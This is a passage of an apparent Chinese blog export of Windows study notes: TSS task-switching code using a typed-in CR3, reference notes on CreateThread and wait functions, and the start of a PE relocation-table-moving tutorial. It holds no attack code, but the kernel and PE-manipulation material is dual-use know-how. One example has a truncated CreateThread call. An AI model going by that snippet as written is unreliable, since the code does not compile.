class="line">USHORT Reserved6;                                                       <span class="comment">//0x5a</span></span><br><span class="line">USHORT Gs;                                                              <span class="comment">//0x5c</span></span><br><span class="line">USHORT Reserved7;                                                       <span class="comment">//0x5e</span></span><br><span class="line">USHORT LDT;                                                             <span class="comment">//0x60</span></span><br><span class="line">USHORT Reserved8;                                                       <span class="comment">//0x62</span></span><br><span class="line">USHORT Flags;                                                           <span class="comment">//0x64</span></span><br><span class="line">USHORT IoMapBase;                                                       <span class="comment">//0x66</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_KiIoAccessMap</span> IoMaps[<span class="number">1</span>];                                        <span class="comment">//0x68</span></span><br><span class="line">UCHAR IntDirectionMap[<span class="number">32</span>];                                              <span class="comment">//0x208c</span></span><br><span class="line">&#125;KTSS;</span><br><span class="line"></span><br><span class="line">KTSS tss = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> bufEsp0[<span class="number">0x2000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> bufEsp3[<span class="number">0x2000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">pushfd;</span><br><span class="line">pop eax;</span><br><span class="line"><span class="keyword">or</span> eax, <span class="number">0x4000</span>;</span><br><span class="line">push eax;</span><br><span class="line">popfd;</span><br><span class="line">iretd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">__asm </span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">jmp fword ptr szRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// 0</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WORD tr = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">str tr;</span><br><span class="line">&#125;</span><br><span class="line">*(WORD*)&amp;szRet[<span class="number">4</span>] = tr;       <span class="comment">// 保存旧的tr值</span></span><br><span class="line"><span class="built_in">memset</span>(bufEsp0, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"><span class="built_in">memset</span>(bufEsp3, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">tss.Esp0 = (ULONG)bufEsp0 + <span class="number">0x1FF0</span>;</span><br><span class="line">tss.Esp = (ULONG)bufEsp3 + <span class="number">0x1FF0</span>;</span><br><span class="line">tss.Eax = <span class="number">0x1111</span>;</span><br><span class="line">tss.Ss0 = <span class="number">0x10</span>;</span><br><span class="line">tss.Ss = <span class="number">0x10</span>;</span><br><span class="line">tss.Cs = <span class="number">0x8</span>;</span><br><span class="line">tss.Ds = <span class="number">0x23</span>;</span><br><span class="line">tss.Es = <span class="number">0x23</span>;</span><br><span class="line">tss.Fs = <span class="number">0x30</span>;</span><br><span class="line">tss.EFlags = <span class="number">2</span>;</span><br><span class="line">tss.Eip = (ULONG)test;</span><br><span class="line">tss.IoMapBase = <span class="number">0x20ac</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入你的CR3: &quot;</span>);</span><br><span class="line">DWORD dwCr3 = <span class="number">0</span>;</span><br><span class="line">ULONG ulCr3 = <span class="number">0</span>;</span><br><span class="line">ULONG pCr3 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class="line"></span><br><span class="line">tss.CR3 = dwCr3;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, &amp;tss);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bufCode[<span class="number">6</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// call fword ptr bufCode;</span></span><br><span class="line">jmp fword ptr bufCode;<span class="comment">// jmp实现任务切换</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密壳</title>
      <link href="/175feeb0.html"/>
      <url>/175feeb0.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>加密壳</strong></p></div><span id="more"></span><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><h2 id="解壳"><a href="#解壳" class="headerlink" title="解壳"></a>解壳</h2>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows线程控制</title>
      <link href="/a313d734.html"/>
      <url>/a313d734.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>Windows线程控制</p></div><span id="more"></span><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CreateEvent</title>
      <link href="/a0774706.html"/>
      <url>/a0774706.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CreateThread</title>
      <link href="/906a06b0.html"/>
      <url>/906a06b0.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>创建在调用进程的虚拟地址空间内执行的线程。<br>若要创建在另一个进程的虚拟地址空间中运行的线程，请使用<code>CreateRemoteThread</code>函数。</p></div><span id="more"></span><h2 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="lpThreadAttributes"><a href="#lpThreadAttributes" class="headerlink" title="lpThreadAttributes"></a>lpThreadAttributes</h3><p>指向<code>SECURITY_ATTRIBUTES</code>结构的指针, 该结构确定是否可由子进程继承返回的句柄。如果<code>lpThreadAttributes</code>为<code>NULL</code>, 则无法进程句柄;</p><h3 id="dwStackSize"><a href="#dwStackSize" class="headerlink" title="dwStackSize"></a>dwStackSize</h3><p>堆栈的初始大小（以字节为单位）。系统将此值舍入到最近的页面。如果此参数为零, 则新线程将使用可执行文件的默认大小;</p><h3 id="lpStartAddress"><a href="#lpStartAddress" class="headerlink" title="lpStartAddress"></a>lpStartAddress</h3><p>指向要由线程执行的应用程序定义函数的指针。此指针表示线程的起始地址;</p><ul><li><code>lpStartAddress</code>函数原型<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPVOID lpParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="lpParameter"><a href="#lpParameter" class="headerlink" title="lpParameter"></a>lpParameter</h3><p>指向要传递给线程的变量的指针;</p><h3 id="dwCreationFlags"><a href="#dwCreationFlags" class="headerlink" title="dwCreationFlags"></a>dwCreationFlags</h3><p>控制线程的标志</p><table><thead><tr><th align="left">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">线程在创建后立即运行</td></tr><tr><td align="left">CREATE_SUSPENDED 0x00000004</td><td align="left">线程以挂起状态创建, 在调用<code>ResumeThread</code>函数之前不会运行</td></tr><tr><td align="left">STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000</td><td align="left"><code>dwStackSize</code>参数指定堆栈的初始保留大小。如果未指定此标志, <code>dwStackSize</code>将指定提交大小</td></tr></tbody></table><h3 id="lpThreadId"><a href="#lpThreadId" class="headerlink" title="lpThreadId"></a>lpThreadId</h3><p>指向接收线程标识符的变量的指针。如果此参数为<code>NULL</code>, 则不返回线程标识符;</p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><blockquote><p>如果函数成功, 则返回值是新线程的句柄;<br>如果函数失败, 则返回值为<code>NULL</code>;</p></blockquote><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFirstProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WCHAR wcBuffer[<span class="number">20</span>]&#123;&#125;;</span><br><span class="line">DWORD dwTimer = <span class="number">0</span>;</span><br><span class="line">::<span class="built_in">GetWindowText</span>((HWND)lpParameter, wcBuffer, <span class="number">20</span>);</span><br><span class="line">WCHAR wcValue[<span class="number">20</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> iValue = _wtoi(wcBuffer);</span><br><span class="line"><span class="keyword">while</span> (iValue &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wsprintf</span>(wcValue, <span class="string">L&quot;%d&quot;</span>, --iValue);</span><br><span class="line">::<span class="built_in">SetWindowText</span>((HWND)lpParameter, wcValue);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadSecondProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WCHAR wcBuffer[<span class="number">20</span>]&#123;&#125;;</span><br><span class="line">DWORD dwTimer = <span class="number">0</span>;</span><br><span class="line">::<span class="built_in">GetWindowText</span>((HWND)lpParameter, wcBuffer, <span class="number">20</span>);</span><br><span class="line">WCHAR wcValue[<span class="number">20</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> iValue = _wtoi(wcBuffer);</span><br><span class="line"><span class="keyword">while</span> (iValue &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wsprintf</span>(wcValue, <span class="string">L&quot;%d&quot;</span>, ++iValue);</span><br><span class="line">::<span class="built_in">SetWindowText</span>((HWND)lpParameter, wcValue);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CWnd* pWndFirst = <span class="built_in">GetDlgItem</span>(IDC_EDIT1);</span><br><span class="line">HWND hWndFirst = pWndFirst-&gt;<span class="built_in">GetSafeHwnd</span>();</span><br><span class="line">CWnd* pWndSecond = <span class="built_in">GetDlgItem</span>(IDC_EDIT2);</span><br><span class="line">HWND hWndSecond = pWndSecond-&gt;<span class="built_in">GetSafeHwnd</span>();</span><br><span class="line">HANDLE hThreadFirst = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFirstProc, hWndFirst, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThreadSecond = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadSecondProc, hWndSecond, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h2><div class="note info"><p><strong>功能说明</strong></p><p>等待函数可使线程自愿进入等待状态, 直到一个特定的内核对象变为已通知状态为止;</p></div><h2 id="函数声明-1"><a href="#函数声明-1" class="headerlink" title="函数声明"></a>函数声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">DWORD</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hHandle,            <span class="comment">// handle to object</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwMilliseconds       <span class="comment">// time-out interval</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><h3 id="hHandle"><a href="#hHandle" class="headerlink" title="hHandle"></a>hHandle</h3><p>内核对象句柄, 可以是进程也可以是线程;</p><h3 id="dwMilliseconds"><a href="#dwMilliseconds" class="headerlink" title="dwMilliseconds"></a>dwMilliseconds</h3><p>等待时间, 单位是毫秒; <code>INFINITE(-1)</code>一直等待;</p><h2 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h2><ul><li>WAIT_OBJECT_0(0); 等待对象变为已通知;</li><li>WAIT_TIMEOUT(0x102); 超时;</li></ul><h2 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h2><blockquote><ol><li>内核对象中的每种对象都可以说是处于已通知或未通知的状态之中;</li><li>这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的;</li><li>当线程正在运行的时候, 线程内核对象处于未通知状态;</li><li>当线程终止运行的时候, 它就变为已通知状态;</li><li>在内核中就是个BOOL值, 运行时FALSE, 结束TRUE;</li></ol></blockquote><h2 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;+++++++++\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建一个新的线程</span></span><br><span class="line">    HANDLE hThread1 = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, </span><br><span class="line">    DWORD dwCode = ::<span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a>WaitForMultipleObjects</h2><div class="note info"><p><strong>功能说明</strong></p><p>同时查看若干个内核对象的已通知状态;</p></div><h2 id="函数声明-2"><a href="#函数声明-2" class="headerlink" title="函数声明"></a>函数声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">DWORD</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD nCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_(nCount) CONST HANDLE* lpHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bWaitAll,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h2 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h2><h3 id="nCount"><a href="#nCount" class="headerlink" title="nCount"></a>nCount</h3><p>要查看内核对象的数量;</p><h3 id="lpHandles"><a href="#lpHandles" class="headerlink" title="lpHandles"></a>lpHandles</h3><p>内核对象数组</p><h3 id="bWaitAll"><a href="#bWaitAll" class="headerlink" title="bWaitAll"></a>bWaitAll</h3><p>等待类型; TRUE: 等待所有变为已通知, FALSE: 只要有一个变为已通知;</p><h3 id="dwMilliseconds-1"><a href="#dwMilliseconds-1" class="headerlink" title="dwMilliseconds"></a>dwMilliseconds</h3><p>超时时间; <code>INFINITE</code>一直等待;</p><h2 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h2><ul><li>bWaitAll为TRUE时, 返回WAIT_OBJECT_0(0)代码所有内核对象都变为已通知;</li><li>bWaitAll为FALSE时, 返回最先变成已通知的内核对象在数组中的索引;</li><li>WAIT_TIMEOUT(0x102), 超时;</li></ul><h2 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;+++++++++\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">                            </span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;---------\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;               </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">                            </span><br><span class="line">                            </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                            </span><br><span class="line">    HANDLE hArray[<span class="number">2</span>];              </span><br><span class="line">    <span class="comment">//创建一个新的线程</span></span><br><span class="line">    HANDLE hThread1 = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, </span><br><span class="line">        <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                            </span><br><span class="line">    <span class="comment">//创建一个新的线程</span></span><br><span class="line">    HANDLE hThread2 = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);            </span><br><span class="line">    hArray[<span class="number">0</span>] = hThread1;</span><br><span class="line">    hArray[<span class="number">1</span>] = hThread2;           </span><br><span class="line">    DWORD dwCode = ::<span class="built_in">WaitForMultipleObjects</span>(<span class="number">2</span>, hArray,FALSE,INFINITE);                </span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);                 </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动重定位表</title>
      <link href="/5e9312f.html"/>
      <url>/5e9312f.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>移动重定位表</strong></p><p><code>Relocation（重定位）</code>是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中，由于程序中使用了各种全局变量和函数，这些变量和函数的地址还没有确定，因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时，这些相对地址需要被修正为实际的绝对地址，这个过程就是重定位;</p><p>在Windows操作系统中，程序被加载到内存中运行时，需要将程序中的各种内存地址进行重定位，以使程序能够正确地运行。Windows系统使用PE（Portable Executable）文件格式来存储可执行程序，其中包括重定位信息。当程序被加载到内存中时，系统会解析这些重定位信息，并将程序中的各种内存地址进行重定位;</p><p>重定位表一般出现在DLL中，因为DLL都是动态加载，所以地址不固定，DLL的入口点在整个执行过程中至少要执行2次，一次是在开始时执行初始化工作，一次则是在结束时做最后的收尾工作，重定位表则是解决DLL的地址问题;</p></div><span id="more"></span><h2 id="移动重定位表步骤"><a href="#移动重定位表步骤" class="headerlink" title="移动重定位表步骤"></a>移动重定位表步骤</h2><div class="note info"><p><strong></strong></p><ol><li>读取文件并在FileBuffer中新增一个节(<code>.rbase</code>);</li><li>设置节表信息并修正PE头;</li><li>解析重定位表、复制重定位表、修正数据目录;</li><li>将数据写入新的文件;</li><li>验证是否移动成功;</li></ol></div><h3 id="ROA转FOA"><a href="#ROA转FOA" class="headerlink" title="ROA转FOA"></a>ROA转FOA</h3><blockquote><p>将ROA转换成FOA</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RVA2FOA</span><span class="params">(DWORD dwRVA, LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBuffer);</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dwRVA &lt; pSec[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwRVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FOA转RVA"><a href="#FOA转RVA" class="headerlink" title="FOA转RVA"></a>FOA转RVA</h3><blockquote><p>将FOA转化成RVA</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">FOA2RVA</span><span class="params">(DWORD dwFOA, LPVOID lpBuffer)</span></span></span><br><span 